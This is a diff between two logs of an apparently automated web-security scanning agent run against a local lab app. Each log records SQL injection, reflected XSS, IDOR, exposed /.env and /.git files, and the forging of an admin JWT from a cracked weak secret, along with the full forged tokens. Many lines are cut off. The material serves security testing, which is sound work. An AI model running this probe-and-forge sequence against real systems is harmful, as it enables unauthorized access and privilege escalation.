@@ -1,41 +1,41 @@
-[01:05:40] session 20261109-010540-127.0.0.1 -> http://127.0.0.1:61192
-[01:05:40] agent: Baseline-diffed probes first: /item looks injectable.
-[01:05:40] tool probe_sqli {"url": "http://127.0.0.1:61192/item?id=1", "param": "id"}
-[01:05:40]   -> {"result": {"verdict": "error-based candidate (xpath exfil - extracted value echoed in the error)", "signal": "sqlite3", "request_ids": {"base": "r1", "quote": "r2", "true": "r3", "false": "r4", "ntrue": "r5", "nfalse": "r6", "otrue": "r7", "ofalse": "r8", "notrue": "r9", "nofalse": "r10", "xpath": 
-[01:05:40] agent: Error channel confirms SQLi - recording with verbatim evidence.
-[01:05:40] tool record_finding {"title": "SQL injection in /item id parameter", "severity": "high", "category": "sqli", "url": "http://127.0.0.1:61192/item?id=1", "evidence_excerpt": "sqlite3.OperationalError", "description": "The 
-[01:05:40]   -> {"result": {"recorded": "F01", "title": "SQL injection in /item id parameter", "severity": "high"}}
-[01:05:40] agent: Now the reflected-parameter family.
-[01:05:40] tool probe_reflection {"url": "http://127.0.0.1:61192/search?q=x", "param": "q"}
-[01:05:40]   -> {"result": {"request_id": "r12", "reflected": true, "verdict": "reflected", "context": "html", "unescaped_chars": ["<", ">", "\"", "'", "&"], "excerpt": "<html><body>Results for: x2niuauci<>'\"&=/</body></html>", "note": "context tells you the payload shape; unescaped < > \" ' means exploitable"}}
-[01:05:40] agent: Reflected with unescaped special chars - XSS lead.
-[01:05:40] tool record_finding {"title": "Reflected XSS in /search q parameter", "severity": "medium", "category": "xss", "url": "http://127.0.0.1:61192/search?q=x", "evidence_excerpt": "<>'\"&=/", "description": "Canary chars < > 
-[01:05:40]   -> {"result": {"recorded": "F02", "title": "Reflected XSS in /search q parameter", "severity": "medium"}}
-[01:05:40] agent: Object-level authorization next.
-[01:05:40] tool probe_idor {"url": "http://127.0.0.1:61192/api/user/2"}
-[01:05:40]   -> {"result": {"verdict": "idor candidate: neighboring object ids return 200 with different content - verify the object isn't yours", "base_id": "r13", "results": [{"request_id": "r14", "status": 200, "similarity_to_base": 0.76, "accessible": true, "excerpt": "{\"id\": 3, \"username\": \"bob\", \"role\
-[01:05:40] agent: Neighbor id returns a different principal - IDOR.
-[01:05:40] tool record_finding {"title": "IDOR: /api/user/<id> serves any user object", "severity": "high", "category": "idor", "url": "http://127.0.0.1:61192/api/user/2", "evidence_excerpt": "\"username\"", "description": "Neighbo
-[01:05:40]   -> {"result": {"recorded": "F03", "title": "IDOR: /api/user/<id> serves any user object", "severity": "high"}}
-[01:05:40] agent: Sensitive-artifact sweep before finishing.
-[01:05:40] tool probe_disclosure {"url": "http://127.0.0.1:61192"}
-[01:05:40]   -> {"result": {"verdict": "3 exposed sensitive path(s): /.git/HEAD, /.env, /debug", "checked": 37, "exposed": [{"path": "/.git/HEAD", "request_id": "r18", "bytes": 20, "signature": "^ref:\\s|^[0-9a-f]{40}"}, {"path": "/.env", "request_id": "r20", "bytes": 67, "signature": "^[A-Z_]+=|DB_|SECRET|TOKEN|KE
-[01:05:40] agent: Exposed secrets on the web root - recording.
-[01:05:40] tool record_finding {"title": "Exposed /.env and /.git/HEAD at web root", "severity": "medium", "category": "info-disclosure", "url": "http://127.0.0.1:61192/.env", "evidence_excerpt": "SECRET_KEY=lab-secret-0123", "desc
-[01:05:40]   -> {"result": {"recorded": "F04", "title": "Exposed /.env and /.git/HEAD at web root", "severity": "medium"}}
-[01:05:40] agent: The session token itself is the next surface.
-[01:05:40] tool jwt_decode {"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJ1c2VyIiwgImlhdCI6IDE3OTQxNjExNDB9.U7kV-fq5jci2HBPMBvlSNb-o7Zdp3OR9umkgtZoMvCY"}
-[01:05:40]   -> {"result": {"header": {"alg": "HS256", "typ": "JWT"}, "payload": {"sub": "alice", "role": "user", "iat": 1794161140}, "recovered_secret": "secret123", "issues": ["weak HMAC secret recovered offline: 'secret123'"]}}
-[01:05:40] agent: Weak HMAC secret recovered offline - forge an admin token and prove acceptance.
-[01:05:40] tool jwt_forge {"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJ1c2VyIiwgImlhdCI6IDE3OTQxNjExNDB9.U7kV-fq5jci2HBPMBvlSNb-o7Zdp3OR9umkgtZoMvCY", "claims": "{\"user\":\"admin\",\"
-[01:05:40]   -> {"result": {"resigned": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDE2MTE0MCwidXNlciI6ImFkbWluIn0.f8LL38vVNQ8w6uMY3E3JXjVx2hsF4azFZGo-5orh6w0", "alg_none": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDE2MTE
-[01:05:40] tool http_request {"method": "GET", "url": "http://127.0.0.1:61192/api/me", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDE2MTE0MCwidXNl
-[01:05:40]   -> {"result": {"request_id": "r55", "status": 200, "elapsed_ms": 0.0, "headers": {"server": "LabVuln/1.0 Python/3.12.0", "date": "Sun, 08 Nov 2026 18:05:40 GMT", "content-type": "application/json", "x-powered-by": "LabVuln/1.0", "content-length": "93"}, "body": "{\"ok\": true, \"claims\": {\"sub\": \"a
-[01:05:40] agent: Forged claims returned by the server - privilege escalation proven end to end.
-[01:05:40] tool record_finding {"title": "JWT weak secret: forged admin token accepted", "severity": "critical", "category": "jwt", "url": "http://127.0.0.1:61192/api/me", "evidence_excerpt": "\"role\": \"admin\"", "description": "
-[01:05:40]   -> {"result": {"recorded": "F05", "title": "JWT weak secret: forged admin token accepted", "severity": "critical"}}
-[01:05:40] tool probe_xfh {"url": "http://127.0.0.1:61192/reset"}
-[01:05:40]   -> {"result": {"request_id": "r56", "canary": "xfhyv96ejyn.argus.invalid", "reflected_in": "body", "verdict": "host-header candidate: X-Forwarded-Host reflected in body"}}
-[01:05:40] tool finish {"summary": "Demo run: SQLi + XSS + IDOR + info disclosure + forged-JWT admin takeover verified with verbatim evidence; host-header reflection left as a lead for manual follow-up."}
-[01:05:40]   -> {"result": {"finished": true, "stats": {"requests": 56, "findings": 5, "elapsed_s": 0.3}}}
-[01:05:40] done in 14 turns; findings=5
+[01:08:03] session 20261109-010802-127.0.0.1 -> http://127.0.0.1:42394
+[01:08:03] agent: Baseline-diffed probes first: /item looks injectable.
+[01:08:03] tool probe_sqli {"url": "http://127.0.0.1:42394/item?id=1", "param": "id"}
+[01:08:03]   -> {"result": {"verdict": "error-based candidate (xpath exfil - extracted value echoed in the error)", "signal": "sqlite3", "request_ids": {"base": "r1", "quote": "r2", "true": "r3", "false": "r4", "ntrue": "r5", "nfalse": "r6", "otrue": "r7", "ofalse": "r8", "notrue": "r9", "nofalse": "r10", "xpath": 
+[01:08:03] agent: Error channel confirms SQLi - recording with verbatim evidence.
+[01:08:03] tool record_finding {"title": "SQL injection in /item id parameter", "severity": "high", "category": "sqli", "url": "http://127.0.0.1:42394/item?id=1", "evidence_excerpt": "sqlite3.OperationalError", "description": "The 
+[01:08:03]   -> {"result": {"recorded": "F01", "title": "SQL injection in /item id parameter", "severity": "high"}}
+[01:08:03] agent: Now the reflected-parameter family.
+[01:08:03] tool probe_reflection {"url": "http://127.0.0.1:42394/search?q=x", "param": "q"}
+[01:08:03]   -> {"result": {"request_id": "r12", "reflected": true, "verdict": "reflected", "context": "html", "unescaped_chars": ["<", ">", "\"", "'", "&"], "excerpt": "<html><body>Results for: x3am04xe2<>'\"&=/</body></html>", "note": "context tells you the payload shape; unescaped < > \" ' means exploitable"}}
+[01:08:03] agent: Reflected with unescaped special chars - XSS lead.
+[01:08:03] tool record_finding {"title": "Reflected XSS in /search q parameter", "severity": "medium", "category": "xss", "url": "http://127.0.0.1:42394/search?q=x", "evidence_excerpt": "<>'\"&=/", "description": "Canary chars < > 
+[01:08:03]   -> {"result": {"recorded": "F02", "title": "Reflected XSS in /search q parameter", "severity": "medium"}}
+[01:08:03] agent: Object-level authorization next.
+[01:08:03] tool probe_idor {"url": "http://127.0.0.1:42394/api/user/2"}
+[01:08:03]   -> {"result": {"verdict": "idor candidate: neighboring object ids return 200 with different content - verify the object isn't yours", "base_id": "r13", "results": [{"request_id": "r14", "status": 200, "similarity_to_base": 0.76, "accessible": true, "excerpt": "{\"id\": 3, \"username\": \"bob\", \"role\
+[01:08:03] agent: Neighbor id returns a different principal - IDOR.
+[01:08:03] tool record_finding {"title": "IDOR: /api/user/<id> serves any user object", "severity": "high", "category": "idor", "url": "http://127.0.0.1:42394/api/user/2", "evidence_excerpt": "\"username\"", "description": "Neighbo
+[01:08:03]   -> {"result": {"recorded": "F03", "title": "IDOR: /api/user/<id> serves any user object", "severity": "high"}}
+[01:08:03] agent: Sensitive-artifact sweep before finishing.
+[01:08:03] tool probe_disclosure {"url": "http://127.0.0.1:42394"}
+[01:08:03]   -> {"result": {"verdict": "3 exposed sensitive path(s): /.git/HEAD, /.env, /debug", "checked": 37, "exposed": [{"path": "/.git/HEAD", "request_id": "r18", "bytes": 20, "signature": "^ref:\\s|^[0-9a-f]{40}"}, {"path": "/.env", "request_id": "r20", "bytes": 67, "signature": "^[A-Z_]+=|DB_|SECRET|TOKEN|KE
+[01:08:03] agent: Exposed secrets on the web root - recording.
+[01:08:03] tool record_finding {"title": "Exposed /.env and /.git/HEAD at web root", "severity": "medium", "category": "info-disclosure", "url": "http://127.0.0.1:42394/.env", "evidence_excerpt": "SECRET_KEY=lab-secret-0123", "desc
+[01:08:03]   -> {"result": {"recorded": "F04", "title": "Exposed /.env and /.git/HEAD at web root", "severity": "medium"}}
+[01:08:03] agent: The session token itself is the next surface.
+[01:08:03] tool jwt_decode {"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJ1c2VyIiwgImlhdCI6IDE3OTQxNjEyODJ9.DHJUyElfRXxwm7B8Zj3gD_YQkkXd__Edx5YNcJMiNoU"}
+[01:08:03]   -> {"result": {"header": {"alg": "HS256", "typ": "JWT"}, "payload": {"sub": "alice", "role": "user", "iat": 1794161282}, "recovered_secret": "secret123", "issues": ["weak HMAC secret recovered offline: 'secret123'"]}}
+[01:08:03] agent: Weak HMAC secret recovered offline - forge an admin token and prove acceptance.
+[01:08:03] tool jwt_forge {"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJ1c2VyIiwgImlhdCI6IDE3OTQxNjEyODJ9.DHJUyElfRXxwm7B8Zj3gD_YQkkXd__Edx5YNcJMiNoU", "claims": "{\"user\":\"admin\",\"
+[01:08:03]   -> {"result": {"resigned": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDE2MTI4MiwidXNlciI6ImFkbWluIn0.fX6Tr4lb5GxXQ8Vy22cLFbIj0fKHylz0V2tBzhq1AZg", "alg_none": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDE2MTI
+[01:08:03] tool http_request {"method": "GET", "url": "http://127.0.0.1:42394/api/me", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDE2MTI4MiwidXNl
+[01:08:03]   -> {"result": {"request_id": "r55", "status": 200, "elapsed_ms": 0.0, "headers": {"server": "LabVuln/1.0 Python/3.12.0", "date": "Sun, 08 Nov 2026 18:08:03 GMT", "content-type": "application/json", "x-powered-by": "LabVuln/1.0", "content-length": "93"}, "body": "{\"ok\": true, \"claims\": {\"sub\": \"a
+[01:08:03] agent: Forged claims returned by the server - privilege escalation proven end to end.
+[01:08:03] tool record_finding {"title": "JWT weak secret: forged admin token accepted", "severity": "critical", "category": "jwt", "url": "http://127.0.0.1:42394/api/me", "evidence_excerpt": "\"role\": \"admin\"", "description": "
+[01:08:03]   -> {"result": {"recorded": "F05", "title": "JWT weak secret: forged admin token accepted", "severity": "critical"}}
+[01:08:03] tool probe_xfh {"url": "http://127.0.0.1:42394/reset"}
+[01:08:03]   -> {"result": {"request_id": "r56", "canary": "xfh60j7y6r2.argus.invalid", "reflected_in": "body", "verdict": "host-header candidate: X-Forwarded-Host reflected in body"}}
+[01:08:03] tool finish {"summary": "Demo run: SQLi + XSS + IDOR + info disclosure + forged-JWT admin takeover verified with verbatim evidence; host-header reflection left as a lead for manual follow-up."}
+[01:08:03]   -> {"result": {"finished": true, "stats": {"requests": 56, "findings": 5, "elapsed_s": 0.4}}}
+[01:08:03] done in 14 turns; findings=5
